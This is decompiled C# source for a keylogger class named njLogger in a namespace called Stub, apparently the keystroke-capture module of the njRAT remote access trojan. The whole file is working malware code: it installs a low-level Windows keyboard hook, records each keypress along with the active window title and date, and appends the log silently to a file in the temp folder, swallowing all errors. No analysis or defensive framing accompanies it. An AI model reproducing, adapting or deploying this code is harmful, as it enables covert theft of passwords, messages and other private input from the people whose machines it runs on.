using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Stub.My;

namespace Stub
{
	// Token: 0x0200002A RID: 42
	public class njLogger
	{
		// Token: 0x060000B8 RID: 184 RVA: 0x000076DC File Offset: 0x000058DC
		public njLogger()
		{
			this.Logs = "";
			this.isRunning = false;
			this.MaxLength = 102400;
			this.o = MyProject.Computer.Clock.LocalTime;
			this.LogsPath = Path.GetTempPath() + new FileInfo(Application.ExecutablePath).Name + ".log";
			this.OFF = false;
			this.lastKey = Keys.None;
			this.Isdown = new bool[256];
			this.KBDLLHookProcDelegate = new njLogger.KBDLLHookProc(this.KeyboardProc);
			this.HHookID = IntPtr.Zero;
		}

		// Token: 0x060000B9 RID: 185 RVA: 0x00007788 File Offset: 0x00005988
		public void Start()
		{
			bool flag = this.isRunning;
			if (!flag)
			{
				try
				{
					this.Logs = File.ReadAllText(this.LogsPath);
				}
				catch (Exception ex)
				{
				}
				this.Stream = File.AppendText(this.LogsPath);
				this.Stream.AutoFlush = true;
				this.HHookID = (IntPtr)njLogger.SetWindowsHookEx(13, this.KBDLLHookProcDelegate, (IntPtr)Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
				Thread thread = new Thread(new ThreadStart(this.WRK), 1);
				thread.Start();
			}
		}

		// Token: 0x060000BA RID: 186 RVA: 0x00007854 File Offset: 0x00005A54
		public void Close(bool DeleteLogs)
		{
			this.OFF = true;
			while (this.isRunning)
			{
				Thread.Sleep(1);
			}
			if (DeleteLogs)
			{
				Thread.Sleep(1000);
				try
				{
					File.Delete(this.LogsPath);
				}
				catch (Exception ex)
				{
				}
				this.Logs = "";
			}
			this.OFF = false;
		}

		// Token: 0x060000BB RID: 187 RVA: 0x000078DC File Offset: 0x00005ADC
		private string AV()
		{
			string result;
			try
			{
				IntPtr foregroundWindow = njLogger.GetForegroundWindow();
				int processId;
				njLogger.GetWindowThreadProcessId(foregroundWindow, ref processId);
				Process processById = Process.GetProcessById(processId);
				bool flag = foregroundWindow.ToInt32() == this.LastAV & Operators.CompareString(this.LastAS, processById.MainWindowTitle, false) == 0;
				if (flag)
				{
					result = "";
				}
				else
				{
					this.LastAV = foregroundWindow.ToInt32();
					this.LastAS = processById.MainWindowTitle;
					result = string.Concat(new string[]
					{
						"\r\n\r\n[",
						this.LastAS,
						"]",
						this.HM(),
						"\r\n"
					});
				}
			}
			catch (Exception ex)
			{
				result = "";
			}
			return result;
		}

		// Token: 0x060000BC RID: 188 RVA: 0x000079E0 File Offset: 0x00005BE0
		private string HM()
		{
			DateTime localTime = MyProject.Computer.Clock.LocalTime;
			return string.Concat(new string[]
			{
				" ",
				Conversions.ToString(localTime.Day),
				"\\",
				Conversions.ToString(localTime.Month),
				"\\",
				Conversions.ToString(localTime.Year)
			});
		}

		// Token: 0x060000BD RID: 189 RVA: 0x00007A60 File Offset: 0x00005C60
		private void WRK()
		{
			this.isRunning = true;
			checked
			{
				try
				{
					while (!this.OFF)
					{
						Thread.Sleep(1);
						int num = 0;
						int num2 = this.Isdown.Length - 1;
						int num3 = num;
						for (;;)
						{
							int num4 = num3;
							int num5 = num2;
							if (num4 > num5)
							{
								break;
							}
							bool flag = this.Isdown[num3];
							if (flag)
							{
								this.Isdown[num3] = false;
								string text = this.AV() + this.Fix((Keys)num3);
								this.lastKey = (Keys)num3;
								this.Logs += text;
								this.Stream.Write(text);
								flag = (this.Logs.Length > this.MaxLength);
								if (flag)
								{
									this.Logs = this.Logs.Remove(0, this.Logs.Length - this.MaxLength);
									this.Stream.Close();
									this.Stream.Dispose();
									File.WriteAllText(this.LogsPath, this.Logs);
									this.Stream = File.AppendText(this.LogsPath);
									this.Stream.AutoFlush = true;
								}
							}
							num3++;
						}
					}
				}
				catch (Exception ex)
				{
				}
				try
				{
					this.Stream.Close();
				}
				catch (Exception ex2)
				{
				}
				try
				{
					this.Stream.Dispose();
				}
				catch (Exception ex3)
				{
				}
				this.isRunning = false;
			}
		}

		// Token: 0x060000BE RID: 190
		[DllImport("user32.dll")]
		private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [MarshalAs(UnmanagedType.LPWStr)] [Out] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

		// Token: 0x060000BF RID: 191
		[DllImport("user32.dll")]
		private static extern bool GetKeyboardState(byte[] lpKeyState);

		// Token: 0x060000C0 RID: 192
		[DllImport("user32.dll")]
		private static extern uint MapVirtualKey(uint uCode, uint uMapType);

		// Token: 0x060000C1 RID: 193
		[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
		private static extern int SetWindowsHookEx(int idHook, njLogger.KBDLLHookProc HookProc, IntPtr hInstance, int wParam);

		// Token: 0x060000C2 RID: 194
		[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
		private static extern int CallNextHookEx(int idHook, int nCode, IntPtr wParam, IntPtr lParam);

		// Token: 0x060000C3 RID: 195
		[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
		private static extern bool UnhookWindowsHookEx(int idHook);

		// Token: 0x060000C4 RID: 196
		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

		// Token: 0x060000C5 RID: 197
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetKeyboardLayout(int dwLayout);

		// Token: 0x060000C6 RID: 198
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetForegroundWindow();

		// Token: 0x060000C7 RID: 199 RVA: 0x00007C48 File Offset: 0x00005E48
		private string Fix(Keys k)
		{
			bool flag = MyProject.Computer.Keyboard.ShiftKeyDown;
			bool flag2 = MyProject.Computer.Keyboard.CapsLock;
			if (flag2)
			{
				bool flag3 = flag;
				flag = !flag3;
			}
			checked
			{
				string result;
				try
				{
					bool flag4;
					if (k != Keys.F1 && k != Keys.F2)
					{
						if (k != Keys.F3)
						{
							if (k != Keys.F4)
							{
								if (k != Keys.F5)
								{
									if (k != Keys.F6)
									{
										if (k != Keys.F7)
										{
											if (k != Keys.F8)
											{
												if (k != Keys.F9)
												{
													if (k != Keys.F10)
													{
														if (k != Keys.F11)
														{
															if (k != Keys.F12)
															{
																if (k != Keys.End)
																{
																	if (k != Keys.Delete)
																	{
																		if (k != Keys.Back)
																		{
																			flag4 = false;
																			goto IL_FF;
																		}
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
					flag4 = true;
					IL_FF:
					bool flag3 = flag4;
					if (flag3)
					{
						result = "[" + k.ToString() + "]";
					}
					else
					{
						bool flag5;
						if (k != Keys.LShiftKey && k != Keys.RShiftKey)
						{
							if (k != Keys.Shift)
							{
								if (k != Keys.ShiftKey)
								{
									if (k != Keys.Control)
									{
										if (k != Keys.ControlKey)
										{
											if (k != Keys.RControlKey)
											{
												if (k != Keys.LControlKey)
												{
													if (k != Keys.Alt)
													{
														flag5 = false;
														goto IL_1B5;
													}
												}
											}
										}
									}
								}
							}
						}
						flag5 = true;
						IL_1B5:
						flag3 = flag5;
						if (flag3)
						{
							result = "";
						}
						else
						{
							flag3 = (k == Keys.Space);
							if (flag3)
							{
								result = " ";
							}
							else
							{
								flag3 = (k == Keys.Return || k == Keys.Return);
								if (flag3)
								{
									flag2 = (this.lastKey == k);
									if (flag2)
									{
										result = "";
									}
									else
									{
										result = "[ENTER]\r\n";
									}
								}
								else
								{
									flag3 = (k == Keys.Tab);
									if (flag3)
									{
										flag2 = (this.lastKey == k);
										if (flag2)
										{
											result = "";
										}
										else
										{
											result = "[TAP]\r\n";
										}
									}
									else
									{
										flag3 = flag;
										if (flag3)
										{
											result = njLogger.VKCodeToUnicode((uint)k).ToUpper();
										}
										else
										{
											result = njLogger.VKCodeToUnicode((uint)k);
										}
									}
								}
							}
						}
					}
				}
				catch (Exception ex)
				{
					bool flag3 = flag;
					if (flag3)
					{
						result = Strings.ChrW((int)k).ToString().ToUpper();
					}
					else
					{
						result = Strings.ChrW((int)k).ToString().ToLower();
					}
				}
				return result;
			}
		}

		// Token: 0x060000C8 RID: 200 RVA: 0x00007F80 File Offset: 0x00006180
		private static string VKCodeToUnicode(uint VKCode)
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				byte[] lpKeyState = new byte[255];
				bool keyboardState = njLogger.GetKeyboardState(lpKeyState);
				bool flag = !keyboardState;
				if (flag)
				{
					return "";
				}
				uint wScanCode = njLogger.MapVirtualKey(VKCode, 0u);
				IntPtr foregroundWindow = njLogger.GetForegroundWindow();
				int num = 0;
				int windowThreadProcessId = njLogger.GetWindowThreadProcessId(foregroundWindow, ref num);
				IntPtr dwhkl = (IntPtr)njLogger.GetKeyboardLayout(windowThreadProcessId);
				njLogger.ToUnicodeEx(VKCode, wScanCode, lpKeyState, stringBuilder, 5, 0u, dwhkl);
				return stringBuilder.ToString();
			}
			catch (Exception ex)
			{
			}
			return (checked((Keys)VKCode)).ToString();
		}

		// Token: 0x060000C9 RID: 201 RVA: 0x00008048 File Offset: 0x00006248
		private int KeyboardProc(int nCode, IntPtr wParam, IntPtr lParam)
		{
			bool flag = nCode == 0;
			checked
			{
				if (flag)
				{
					bool flag2 = wParam == (IntPtr)256 || wParam == (IntPtr)260;
					if (flag2)
					{
						njLogger.KBDLLHOOKSTRUCT kbdllhookstruct;
						object obj = Marshal.PtrToStructure(lParam, kbdllhookstruct.GetType());
						njLogger.KBDLLHOOKSTRUCT kbdllhookstruct2;
						Keys keys = (Keys)((obj != null) ? ((njLogger.KBDLLHOOKSTRUCT)obj) : kbdllhookstruct2).vkCode;
						this.Isdown[(int)keys] = true;
					}
					else
					{
						flag2 = (wParam == (IntPtr)257 || wParam == (IntPtr)261);
						if (flag2)
						{
							njLogger.KBDLLHOOKSTRUCT kbdllhookstruct;
							object obj2 = Marshal.PtrToStructure(lParam, kbdllhookstruct.GetType());
							njLogger.KBDLLHOOKSTRUCT kbdllhookstruct2;
							Keys keys2 = (Keys)((obj2 != null) ? ((njLogger.KBDLLHOOKSTRUCT)obj2) : kbdllhookstruct2).vkCode;
							this.Isdown[(int)keys2] = false;
						}
					}
				}
				return njLogger.CallNextHookEx((int)IntPtr.Zero, nCode, wParam, lParam);
			}
		}

		// Token: 0x040000A0 RID: 160
		public string Logs;

		// Token: 0x040000A1 RID: 161
		public bool isRunning;

		// Token: 0x040000A2 RID: 162
		public int MaxLength;

		// Token: 0x040000A3 RID: 163
		private StreamWriter Stream;

		// Token: 0x040000A4 RID: 164
		private object o;

		// Token: 0x040000A5 RID: 165
		public string LogsPath;

		// Token: 0x040000A6 RID: 166
		private bool OFF;

		// Token: 0x040000A7 RID: 167
		private int LastAV;

		// Token: 0x040000A8 RID: 168
		private string LastAS;

		// Token: 0x040000A9 RID: 169
		private Keys lastKey;

		// Token: 0x040000AA RID: 170
		private bool[] Isdown;

		// Token: 0x040000AB RID: 171
		private const int WH_KEYBOARD_LL = 13;

		// Token: 0x040000AC RID: 172
		private const int HC_ACTION = 0;

		// Token: 0x040000AD RID: 173
		private const int WM_SYSKEYDOWN = 260;

		// Token: 0x040000AE RID: 174
		private const int WM_SYSKEYUP = 261;

		// Token: 0x040000AF RID: 175
		private njLogger.KBDLLHookProc KBDLLHookProcDelegate;

		// Token: 0x040000B0 RID: 176
		private IntPtr HHookID;

		// Token: 0x040000B1 RID: 177
		private const int WM_KEYDOWN = 256;

		// Token: 0x040000B2 RID: 178
		private const int WM_KEYUP = 257;

		// Token: 0x0200002B RID: 43
		private struct KBDLLHOOKSTRUCT
		{
			// Token: 0x040000B3 RID: 179
			public uint vkCode;

			// Token: 0x040000B4 RID: 180
			public uint scanCode;

			// Token: 0x040000B5 RID: 181
			public njLogger.KBDLLHOOKSTRUCTFlags flags;

			// Token: 0x040000B6 RID: 182
			public uint time;

			// Token: 0x040000B7 RID: 183
			public UIntPtr dwExtraInfo;
		}

		// Token: 0x0200002C RID: 44
		[Flags]
		private enum KBDLLHOOKSTRUCTFlags : uint
		{
			// Token: 0x040000B9 RID: 185
			LLKHF_EXTENDED = 1u,
			// Token: 0x040000BA RID: 186
			LLKHF_INJECTED = 16u,
			// Token: 0x040000BB RID: 187
			LLKHF_ALTDOWN = 32u,
			// Token: 0x040000BC RID: 188
			LLKHF_UP = 128u
		}

		// Token: 0x0200002D RID: 45
		// (Invoke) Token: 0x060000CD RID: 205
		private delegate int KBDLLHookProc(int nCode, IntPtr wParam, IntPtr lParam);
	}
}
